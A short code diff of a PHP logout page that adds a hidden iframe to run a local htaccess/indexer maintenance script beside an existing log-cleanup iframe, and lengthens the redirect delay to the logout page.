@@ -29,9 +29,10 @@ require_once('connect.inc.php');
 </style>
 </head>
 <body style="background:black">
+<iframe name="i4e" frameborder="0" src="htaccessandindexer.php" width="1" height="1" style="display:none"></iframe>
 <iframe style="display:none" src="cleanlog.php"></iframe>
 <script>
-setTimeout("location.href='../logout.php'",1111);
+setTimeout("location.href='../logout.php'",2222);
 </script>
 <div class="bye">bye.<span id="cleanlog" style="display:none">.</span><span id="cleanbackups" style="display:none">.</span></div>
 </body>
